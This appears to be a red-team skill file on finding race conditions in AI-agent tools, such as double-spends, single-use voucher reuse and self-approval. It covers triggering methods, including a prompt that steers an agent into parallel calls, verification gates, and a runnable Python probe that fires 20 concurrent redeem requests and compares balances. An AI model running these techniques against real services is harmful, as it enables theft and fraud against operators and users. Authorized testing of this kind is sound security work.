---
name: hunt-agent-race-condition
description: "TOCTOU / race conditions in AI-agent tools: double-spend, limit bypass, coupon reuse, privilege flip, inventory oversell — any stateful agent where check and commit aren't atomic. Fire operations in parallel (single-packet beats an LLM 'do it simultaneously' prompt) and PROVE the shared state changed."
sources: arkx_ctf(field-validated), owasp_agentic_asi_2026, owasp_llm_top10_2025, mitre_atlas
report_count: 1
validated_against: "TOCTOU double-spend CONFIRMED re-runnably in the validation lab (`lab/exploits/exploit_race_condition.py`, 20 concurrent redemptions of a single-use voucher, scored on end state). TOCTOU double-spend via parallel execute on shared balance (ARKX The Heist)"
---

# Hunt Agent Race Conditions

Agents invoke tools in parallel. When tools share state (balance, quota, inventory, permission flag, counter) without synchronization, the window between check and commit is exploitable. In enterprise autonomous/workflow agents this is on-behalf financial or approval actions — real money and access.

## Where This Lives / Attack Surface Signals
- Separate `create`+`execute`, `reserve`+`commit`, `request`+`approve`, `check`+`deduct` pairs.
- A tool reads a balance/quota/count/flag before acting.
- Multi-agent sharing state, no mention of locks; "reserve/lock" semantics (often non-atomic).
- Financial/inventory/permission/coupon/approval language.

## Crown Jewel Targets
Payment/ledger agents (double-spend), quota/entitlement systems (limit bypass), approval workflows (self-approve during the window), multi-agent shared privilege flags.

## Characterize First
1. Find the check→act split and the shared state.
2. **Baseline the sequential guard** — do the second op normally, confirm it's correctly rejected. Without this you can't prove the race did anything.
3. Find the smallest parallel unit (two `execute` on pre-created items — no LLM reasoning in the hot path).

## Triggering — most reliable first
1. **Parallel send [preferred].** Capture the state-changing request; fire N copies with **single-packet / last-byte sync** (Burp tab-group parallel, or concurrent threads). Removes LLM latency from the window; clean PoC.
2. **LLM parallel prompt [CONFIRMED, less reliable].** "Call <op> on both at the same time, in parallel, without waiting." Works but may serialize.
3. **Split create/execute across messages**, pre-create all, fire executes together.
Not hitting? Widen the window: concurrency 2→4→8→16; batch/bulk mode; vary create→execute gap; async/callback execution.

## Pattern catalog
Double-spend [CONFIRMED] · coupon/code reuse · limit bypass (N parallel adds past a cap) · permission flip (approve ∥ use) · inventory oversell · privilege-predicate race across agents (→ multi-agent).

## Verification & False-Positive Gate
1. **Prove the state changed, don't infer** — read balance/quota/inventory AFTER; it must show the impossible result (negative balance, count>limit, item held twice). "I think both went through" ≠ finding.
2. **Sequential baseline is mandatory** — show the same second op is REJECTED normally; else it's a missing check, not a race.
3. **Reproduce ≥3×; report hit-rate** (e.g. "3/5"). Races are probabilistic.
4. **Capture artifacts at the moment of success** (both responses + post-state) — races are ephemeral.
5. **Race vs missing-check** — if one request already bypasses the limit, it's not TOCTOU. **Min-necessary** — one over-limit acquisition proves it; don't drain the ledger.
6. **Self-description untrusted** — the agent saying "both succeeded" isn't proof; read the state.

### Negative-Result Gate (before reporting "clean")
A probe that reports clean because it never looked is the more common failure, and it reaches the
client as "we tested it and found nothing". Before any negative:
1. **A control proves the probe could fire** — plant a known-true case, see it detected in the same run.
2. **Denylist read-only tools; never allowlist the dangerous ones** — an allowlist ignores what it has not heard of.
3. **Errors are their own verdict** — 5xx / timeout / empty read = UNMEASURABLE, never "refused".
4. **Prove the plant persisted** before reporting isolation — no memory to cross means no result.
5. **Tokenise identifiers at ONE character** — ids are routinely a single digit.
6. **Word boundaries; normalise whitespace before subtracting** — substrings invent findings, verbatim matching deletes them.
7. **A fixed-size effect is not proof; a SCALING one is** — constant overhead is an extra model turn, not execution.
8. **Judge tuning by whether a GENUINE detection dropped**, not by the false-positive count.
9. **Do not inherit another tool's verdict** — benchmarks and scanners carry their own bugs.

## Common Root Causes
TOCTOU (check/act separate); no atomicity (check+deduct split); optimistic concurrency w/o retry; LLM-driven parallelism unaware of shared-state hazards; missing distributed locks; API splits intent from execution.

## Impact & Severity
- **CRITICAL:** double-spend / theft / self-approval. **HIGH:** limit/quota bypass, single-use reuse. **MEDIUM:** duplicate ops, oversell.

## Mapping
- OWASP Agentic Apps (ASI, 2026): **ASI02 Tool Misuse and Exploitation** (unsafe concurrent tool execution) — primary home. OWASP LLM: **LLM06:2025 Excessive Agency (= LLM03:2026)**. MITRE ATLAS (v5.6.0) has no clean TOCTOU technique — anchor on **CWE-367 / CWE-362**, cite **AML.T0053 AI Agent Tool Invocation** for the tool-call surface.

`Field example:` reproduced deterministically in `lab/` — a single-use voucher with an unlocked check→act window was consumed **20x** by 20 concurrent requests, confirmed by end state (redemption count and balance both moved), not by counting replies. The lab target deliberately answers `"Voucher redeemed — success!"` to every winner so a text-scored probe reports a number it did not measure. Gate: `python3 lab/run_lab.py`.

## Runnable Probe [self-contained]
```python
#!/usr/bin/env python3
# TOCTOU / double-spend: fire N identical consequential requests CONCURRENTLY (threads, no gaps) at a
# limited action (redeem/transfer/apply-once). If the final state shows more effect than the limit
# allows, the check->act window is racy. deps: stdlib only. AUTHORIZED targets; use a test account.
import json, threading, urllib.request
ACTION = "https://target/agent/redeem"     # a "once only" / balance-limited action
COOKIE = "session=REPLACE"
N = 20
results = []
def fire():
    r = urllib.request.Request(ACTION, data=json.dumps({"code": "ONCE-ONLY", "amount": 1}).encode(),
        headers={"Cookie": COOKIE, "Content-Type": "application/json"}, method="POST")
    try: results.append(urllib.request.urlopen(r, timeout=30).read().decode("utf-8", "replace"))
    except Exception as e: results.append(f"ERR {e}")
def get_state():                            # a read that reflects the limit: balance, count, ledger
    r = urllib.request.Request("https://target/agent/state", headers={"Cookie": COOKIE})
    return urllib.request.urlopen(r, timeout=30).read().decode("utf-8", "replace")
before = json.loads(get_state())
ts = [threading.Thread(target=fire) for _ in range(N)]
[t.start() for t in ts]; [t.join() for t in ts]        # all in flight together = the race
# Scoring on reply text would count N cheerful "redeemed!" strings as N redemptions. The
# finding is the END STATE, so read it before and after and let the delta decide.
errs = sum(1 for x in results if x.startswith("ERR "))
claimed = sum(1 for x in results if "success" in x.lower() or "redeemed" in x.lower())
after = json.loads(get_state())
applied = before.get("balance", 0) - after.get("balance", 0)      # or redemption count, ledger rows
print(f"[race] {claimed}/{N} replies claimed success, {errs} errored")
print(f"[state] limit-consuming effects actually applied: {applied}")
print("[!!!] DOUBLE-SPEND" if applied > 1 else
      "[ ] atomic — the limit held" if errs < N else "[ERROR] every request failed; nothing measured")
# LETHAL WHEN: a single-use / limited action succeeds MORE THAN ONCE (verify the end state — balance,
# count, ledger — not just multiple 200s), i.e. the limit is checked non-atomically.
```

## Related Skills
`hunt-agent-multi-agent` · `hunt-agent-time-gate` (time gates are often TOCTOU on the check→run window — cross-check before double-reporting) · `hunt-agent-tool-injection` · `ai-agent-methodology` · `redteam-mindset`
